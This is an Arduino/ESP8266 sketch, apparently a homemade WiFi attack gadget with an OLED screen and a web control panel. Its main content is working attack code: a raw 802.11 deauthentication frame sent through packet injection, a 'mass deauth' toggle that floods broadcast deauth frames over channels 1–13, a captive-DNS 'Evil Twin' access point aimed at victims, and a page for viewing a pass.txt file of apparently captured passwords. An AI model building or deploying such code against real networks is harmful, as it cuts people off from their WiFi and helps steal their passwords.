#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

#include "web.h"

Adafruit_SSD1306 display(64, 48, &Wire, -1);
DNSServer dnsServer;
ESP8266WebServer server(80);

bool massOn = false;
uint8_t adminMac[6];
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

// RAW DEAUTH PACKET
uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00, 0x01, 0x00
};

void updateOLED(String msg) {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.println(msg);
  display.display();
}

void attack(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch);
  memcpy(&deauthPacket[4], target, 6);
  memcpy(&deauthPacket[10], ap, 6);
  memcpy(&deauthPacket[16], ap, 6);
  deauthPacket[24] = 0x01; // Reason: Unspecified
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  WiFi.macAddress(adminMac);
  
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.setTextColor(WHITE);
  updateOLED("BOOTING...");

  WiFi.mode(WIFI_AP_STA);
  // SSID GMpro2, Hidden Admin mulai di OFF sesuai request
  WiFi.softAP("GMpro2", "12345678", 1, 0); 
  
  // Power Max 20.5dBm
  system_phy_set_max_tpw(82);
  wifi_set_promiscuous_rx_cb(NULL);
  wifi_promiscuous_enable(1);

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    if (WiFi.softAPIP() == server.client().localIP()) {
      String s = FPSTR(Head);
      s += "<div class='card'><div class='card-title'>WIFI SCANNER</div><table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr></thead><tbody id='scan_body'></tbody></table></div>";
      s += "<div class='card'><div class='card-title'>CONTROL</div><button onclick=\"tgl(this, '/t_mass')\">MASS DEAUTH RUSUH</button></div>";
      s += FPSTR(Mid);
      s += "<div class='card'><div class='card-title'>ADMIN</div><button onclick=\"location.href='/pass.txt'\">VIEW PASS.TXT</button></div>";
      s += FPSTR(Foot);
      server.send(200, "text/html", s);
    } else {
      // Redirect Evil Twin korban ke payload aktif
      server.send(200, "text/html", "<h1>Evil Twin Active</h1>"); 
    }
  });

  server.on("/t_mass", [](){
    massOn = !massOn;
    server.send(200, "text/plain", massOn ? "ON" : "OFF");
    updateOLED(massOn ? "RIOT ON" : "READY");
  });

  server.on("/get_scan", [](){
    int n = WiFi.scanNetworks(false, true); // true = Scan Hidden SSID
    String json = "[";
    for (int i=0; i<n; i++) {
      String ssid = WiFi.SSID(i);
      if(ssid == "") ssid = "[HIDDEN] " + WiFi.BSSIDstr(i);
      json += "{\"ssid\":\""+ssid+"\",\"ch\":"+String(WiFi.channel(i))+",\"usr\":0,\"rssi\":"+String(100+WiFi.RSSI(i))+",\"mac\":\""+WiFi.BSSIDstr(i)+"\"}";
      if(i<n-1) json += ",";
    }
    json += "]";
    server.send(200, "application/json", json);
  });

  server.begin();
  updateOLED("READY");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if(massOn) {
    digitalWrite(2, LOW); // LED ON
    for(int ch=1; ch<=13; ch++) {
      // Broadcast Deauth ke semua channel
      attack(broadcast, broadcast, ch);
      yield();
    }
  } else {
    digitalWrite(2, HIGH); // LED OFF
  }
}
